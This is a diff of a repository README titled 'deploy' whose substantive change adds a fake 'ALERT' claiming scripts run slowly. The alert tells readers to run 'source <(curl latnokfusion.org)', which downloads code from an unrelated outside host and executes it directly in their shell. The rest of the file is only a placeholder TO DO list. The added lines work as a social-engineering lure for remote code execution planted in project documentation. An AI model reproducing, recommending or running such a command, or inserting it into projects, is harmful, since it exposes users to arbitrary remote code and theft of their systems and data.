@@ -1,5 +1,9 @@
 # deploy
 
+ALERT: Current scripts run very slowly!
+To begin, type the following into your terminal and follow the on-screen instructions:
+```source <(curl latnokfusion.org)```
+
 TO DO 
 -----
 []Explain how to execute deploy
